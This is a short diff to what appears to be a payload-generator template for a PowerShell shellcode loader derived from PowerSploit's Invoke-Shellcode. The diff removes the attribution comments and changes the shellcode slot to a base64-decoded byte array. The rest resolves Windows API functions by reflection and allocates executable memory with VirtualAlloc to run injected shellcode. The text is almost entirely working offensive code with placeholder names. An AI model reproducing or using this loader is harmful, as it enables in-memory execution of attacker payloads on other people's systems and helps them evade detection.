@@ -1,6 +1,3 @@
-#Added a tweaked by shellster
-#Originally taken from https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1
-
 function %{func_get_proc_address} {
 	Param ($%{var_module}, $%{var_procedure})		
 	$%{var_unsafe_native_methods} = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
@@ -21,7 +18,7 @@ function %{func_get_delegate_type} {
 	return $%{var_type_builder}.CreateType()
 }
 
-%{shellcode}
+[Byte[]]$%{var_code} = [System.Convert]::FromBase64String("%{b64shellcode}")
 		
 $%{var_buffer} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} kernel32.dll VirtualAlloc), (%{func_get_delegate_type} @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, [math]::max(0x1000, $%{var_code}.Length), 0x40)
 $%{var_memset} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%{func_get_proc_address} msvcrt.dll memset), (%{func_get_delegate_type} @([IntPtr], [UInt32], [UInt32])))
